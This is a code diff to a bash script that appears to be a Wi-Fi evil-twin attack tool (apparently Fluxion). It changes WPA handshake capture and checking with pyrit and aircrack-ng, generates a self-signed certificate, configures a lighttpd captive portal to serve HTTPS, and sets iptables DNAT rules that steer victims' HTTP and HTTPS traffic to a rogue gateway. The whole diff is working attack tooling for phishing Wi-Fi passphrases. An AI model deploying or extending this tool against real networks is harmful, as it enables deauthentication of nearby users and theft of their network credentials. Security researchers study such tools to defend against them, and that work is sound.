@@ -33,7 +33,7 @@ ipNmap=`ifconfig | sed -En 's/127.0.0.1//;s/.*inet (addr:)?(([0-9]*\.){3}[0-9]*)
 # Deauth duration during handshake capture
 # oo
 DEAUTHTIME="9999999999999"
-revision=113
+revision=114
 version=0.23
 IP=192.168.1.1
 RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)
@@ -3586,10 +3586,10 @@ function handshakelocation {
 	infoap
 	if [ -f "/root/handshakes/$Host_SSID2-$Host_MAC.cap" ]; then
 		echo -e "Handshake $yellow$Host_SSID-$Host_MAC.cap$transparent found in /root/handshakes."
-		echo -e "${red}Do you want to use this file? (y/n)"
+		echo -e "${red}Do you want to use this file? (y/N)"
 		echo -ne "$transparent"
 		read usehandshakefile
-		if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "" ]; then
+		if [ "$usehandshakefile" = "y" -o "$usehandshakefile" = "Y" ]; then
 			handshakeloc="/root/handshakes/$Host_SSID2-$Host_MAC.cap"
 		fi
 	fi
@@ -3607,14 +3607,20 @@ function handshakelocation {
 			deauthforce
 		else
 			if [ -f "$handshakeloc" ]; then
-				pyrit -r "$handshakeloc" analyze &>$flux_output_device
+				pyrit -r "$handshakeloc" analyze 2>&1
 				pyrit_broken=$?
-
 				if [ $pyrit_broken = 0 ]; then
-				Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
-				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
-				
+                    
+                    echo $pyrit_broken 
+                    echo "Pyrit"
+                    sleep 3
+                    
+                    Host_SSID_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
+                    Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
 				else
+					echo $pyrit_broken 
+                    echo "aircrack"
+                    sleep 3
 					Host_SSID_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $3}')
 					Host_MAC_loc=$(timeout -s SIGKILL 3 aircrack-ng "$handshakeloc" | grep WPA | grep '1 handshake' | awk '{print $2}')
 				fi
@@ -3623,7 +3629,7 @@ function handshakelocation {
 				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SSID_loc" == *"$Host_SSID"* ]]; then
 					if [ $pyrit_broken = 0 ] && pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "good,"; then
 						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						webinterface
+						certssl
 					else
 					echo -e $yellow "Corrupted handshake" $transparent
 					echo
@@ -3638,7 +3644,7 @@ function handshakelocation {
 					else
 						if timeout -s SIGKILL 3 aircrack-ng $handshakeloc | grep -q "1 handshake"; then
 							cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
-						 	webinterface
+						 	certssl
 						else
 							echo "Corrupted handshake"
 							sleep 2
@@ -3832,7 +3838,7 @@ function checkhandshake {
 		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			wpaclean $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap $DUMP_PATH/$Host_MAC-01.cap &>$flux_output_device
-			webinterface
+			certssl
 			i=2
 			break
 
@@ -3846,7 +3852,7 @@ function checkhandshake {
 		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
 			killall airodump-ng mdk3 aireplay-ng &>$flux_output_device
 			pyrit -r $DUMP_PATH/test.cap -o $HANDSHAKE_PATH/$Host_SSID2-$Host_MAC.cap strip &>$flux_output_device
-			webinterface
+			certssl
 			i=2
 			break
 
@@ -3870,8 +3876,8 @@ function checkhandshake {
 function certssl {
 # Test if the ssl certificate is generated correcly if there is any
 
-		if [ -f /root/server.pem ]; then
-		if [ -s /root/server.pem ]; then
+		if [ -f $DUMP_PATH/server.pem ]; then
+		if [ -s $DUMP_PATH/server.pem ]; then
 
 		webinterface
 		break
@@ -3925,7 +3931,7 @@ function certssl {
 
 # Create Self-Signed SSL Certificate
 function creassl {
-	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /root/server.pem -out /root/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
+	xterm -title "Create Self-Signed SSL Certificate" -e openssl req -subj '/CN=SEGURO/O=SEGURA/OU=SEGURA/C=US' -new -newkey rsa:2048 -days 365 -nodes -x509 -keyout /$DUMP_PATH/server.pem -out /$DUMP_PATH/server.pem # more details there https://www.openssl.org/docs/manmaster/apps/openssl.html
 	certssl
 }
 
@@ -4472,47 +4478,55 @@ range $RANG_IP.100 $RANG_IP.250;
 	# creates Lighttpd web-server
 	echo "server.document-root = \"$DUMP_PATH/data/\"
 
-server.modules = (
-  \"mod_access\",
-  \"mod_alias\",
-  \"mod_accesslog\",
-  \"mod_fastcgi\",
-  \"mod_redirect\",
-  \"mod_rewrite\"
-)
+  server.modules = (
+    \"mod_access\",
+    \"mod_alias\",
+    \"mod_accesslog\",
+    \"mod_fastcgi\",
+    \"mod_redirect\",
+    \"mod_rewrite\"
+  )
 
-fastcgi.server = ( \".php\" => ((
-		  \"bin-path\" => \"/usr/bin/php-cgi\",
-		  \"socket\" => \"/php.socket\"
-		)))
+  fastcgi.server = ( \".php\" => ((
+  		  \"bin-path\" => \"/usr/bin/php-cgi\",
+  		  \"socket\" => \"/php.socket\"
+  		)))
 
-server.port = 80
-server.pid-file = \"/var/run/lighttpd.pid\"
-# server.username = \"www\"
-# server.groupname = \"www\"
+  server.port = 80
+  server.pid-file = \"/var/run/lighttpd.pid\"
+  # server.username = \"www\"
+  # server.groupname = \"www\"
 
-mimetype.assign = (
-\".html\" => \"text/html\",
-\".htm\" => \"text/html\",
-\".txt\" => \"text/plain\",
-\".jpg\" => \"image/jpeg\",
-\".png\" => \"image/png\",
-\".css\" => \"text/css\"
-)
-
-server.error-handler-404 = \"/\"
-
-static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
-index-file.names = ( \"index.htm\",\"index.html\",\"index.php\" )
+  mimetype.assign = (
+  \".html\" => \"text/html\",
+  \".htm\" => \"text/html\",
+  \".txt\" => \"text/plain\",
+  \".jpg\" => \"image/jpeg\",
+  \".png\" => \"image/png\",
+  \".css\" => \"text/css\"
+  )
 
 
+  server.error-handler-404 = \"/\"
 
-#Redirect www.domain.com to domain.com
-\$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
-	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+  static-file.exclude-extensions = ( \".fcgi\", \".php\", \".rb\", \"~\", \".inc\" )
+  index-file.names = ( \"index.htm\" )
 
+  \$SERVER[\"socket\"] == \":443\" {
+  	url.redirect = ( \"^/(.*)\" => \"http://www.internet.com\")
+  	ssl.engine                  = \"enable\"
+  	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
 
-}" > $DUMP_PATH/lighttpd.conf
+  }
+
+  #Redirect www.domain.com to domain.com
+  \$HTTP[\"host\"] =~ \"^www\.(.*)$\" {
+  	url.redirect = ( \"^/(.*)\" => \"http://%1/\$1\" )
+  	ssl.engine                  = \"enable\"
+  	ssl.pemfile                 = \"$DUMP_PATH/server.pem\"
+  }
+  " >$DUMP_PATH/lighttpd.conf
+
 
 # that redirects all DNS requests to the gateway
 	echo "import socket
@@ -4562,6 +4576,7 @@ if __name__ == '__main__':
 }
 
 # Set up DHCP / WEB server
+# Set up DHCP / WEB server
 function routear {
 
 	ifconfig $interfaceroutear up
@@ -4570,15 +4585,18 @@ function routear {
 	route add -net $RANG_IP.0 netmask 255.255.255.0 gw $IP
 	sysctl -w net.ipv4.ip_forward=1 &>$flux_output_device
 
-	iptables --flush
-	iptables --table nat --flush
-	iptables --delete-chain
-	iptables --table nat --delete-chain
-	iptables -P FORWARD ACCEPT
+  iptables --flush
+  iptables --table nat --flush
+  iptables --delete-chain
+  iptables --table nat --delete-chain
+  iptables -P FORWARD ACCEPT
 
-	iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
-	iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:80
-	iptables -t nat -A POSTROUTING -j MASQUERADE
+  iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $IP:80
+  iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination $IP:443
+  iptables -A INPUT -p tcp --sport 443 -j ACCEPT
+  iptables -A OUTPUT -p tcp --dport 443 -j ACCEPT
+  iptables -t nat -A POSTROUTING -j MASQUERADE
+
 }
 
 # Attack
